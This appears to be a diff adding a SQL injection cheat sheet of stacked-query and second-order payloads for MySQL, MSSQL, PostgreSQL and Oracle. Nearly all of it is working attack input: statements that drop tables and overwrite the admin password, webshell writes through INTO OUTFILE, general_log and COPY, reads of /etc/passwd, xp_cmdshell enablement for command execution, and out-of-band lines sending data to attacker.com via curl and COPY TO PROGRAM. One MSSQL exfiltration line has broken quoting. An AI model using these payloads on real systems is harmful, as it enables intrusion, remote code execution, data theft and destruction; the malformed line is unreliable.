@@ -1,0 +1,73 @@
+# STACKED QUERIES + SECOND-ORDER (write-path / multi-statement tricks)
+# Stacked = multiple statements after a quote/terminator. Only some drivers allow it (PHP/PDO mysqli yes by default; PDO pgsql yes; most ORMs no).
+
+## 1) Stacked confirmation
+1'; SELECT SLEEP(5)-- -
+1'; SELECT pg_sleep(5)-- -
+1'; WAITFOR DELAY '0:0:5'-- -
+1'; SELECT IF(1=1,SLEEP(5),0)-- -
+1'; SELECT 1-- -
+1; DROP TABLE IF EXISTS users-- -        # DANGER only on own lab data
+
+## 2) MySQL stacked write paths
+1'; INSERT INTO logs(message) VALUES('pwned')-- -
+1'; UPDATE users SET password='pwned' WHERE username='admin'-- -
+1'; DELETE FROM logs WHERE 1=1-- -       # be careful
+1'; CREATE TABLE pwn(a int)-- -
+1'; SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -   # needs FILE priv + secure_file_priv on
+1'; SELECT LOAD_FILE('/etc/passwd')-- -
+
+## 3) MySQL general_log webshell (when secure_file_priv blocks OUTFILE)
+SET GLOBAL general_log='ON';
+SET GLOBAL general_log_file='/var/www/html/shell.php';
+SELECT '<?php system($_GET[0]); ?>';
+# Restore after: SET GLOBAL general_log='OFF';
+
+## 4) MSSQL stacked -> data steering
+1'; SELECT name FROM sys.tables-- -
+1'; EXEC sp_helpdb-- -
+1'; EXEC xp_cmdshell 'whoami'-- -
+1'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'-- -
+# (Full xp_cmdshell chain lives in 05-mssql-rce-functions.txt)
+
+## 5) PostgreSQL stacked
+1'; CREATE TABLE pwn(a int)-- -
+1'; COPY pwn FROM '/etc/passwd'-- -
+1'; COPY pwn TO '/tmp/pwn'-- -
+1'; SELECT pg_read_file('/etc/passwd')-- -
+1'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/www/shell.php'-- -   # write via superuser (TO/COPY)
+
+## 6) Oracle - no stacked by default (no multi-statement). Use PL/SQL via DBMS_SQL or toxInfo.
+1'||(SELECT DBMS_SQL.EXECUTE_AND_FETCH('SELECT 1 FROM dual') FROM dual)-- -
+# Oracle RCE: 'u'||UTL_INADDR.GET_HOST_NAME('127.0.0.1') - see OOB file for UTL_HTTP.
+
+## 7) SECOND-ORDER - where it bites
+# Profile page saves user-submitted fields (name, about, address, favorites) with
+# parametrized INSERT (safe), then a LATER query builds FROM/WHERE/HAVING with that data unescaped.
+# Attack: register/update profile with the payload as the field value:
+#   For an app that later does: SELECT * FROM carts WHERE owner='<NAME>'
+#   set NAME to:  ' UNION SELECT NULL,username,password FROM users-- -
+# Blind hunting: set value to 1' AND pg_sleep(5)-- - then hit any page that uses the profile.
+# Classic targets: reviews, display names, order shipping notes, "saved searches", usernames.
+# Lab: PortSwigger "SQL injection with filter bypass via XML encoding" + second-order labs.
+
+## 8) Second-order detection kit
+name := 1' OR '1'='1
+name := 1' AND SLEEP(5)-- -
+name := x' AND 1=1-- -
+about := ' UNION SELECT NULL,NULL,NULL-- -
+address := 1' HAVING 1=1-- -
+username := ' OR 'a'='a! - then login as that user
+# Any field that end-stacks into a later dynamic query.
+
+## 9) Self-persisting trigger (MySQL)
+1'; CREATE TRIGGER pwn AFTER INSERT ON logs FOR EACH ROW BEGIN SELECT SLEEP(5); END-- -
+# Then a normal insert triggers sleep - proves stacked + delayed second-order effect.
+
+## 10) Out-of-band write (HTTP) - steal data via web service
+# MSSQL
+1'; DECLARE @r varchar(8000);SELECT @r='http://attacker.com/?d='+DB_NAME();EXEC master..xp_cmdshell 'curl '""" + @r --
+# MySQL file-write OOB
+1'; SELECT 'stuff' INTO OUTFILE '\\\\attacker.com\\share\\out'-- -
+# PG (needs dblink/COPY + outbound):
+1'; COPY (SELECT 'leak') TO PROGRAM 'curl http://attacker.com/?x=leak'-- -   # superuser only
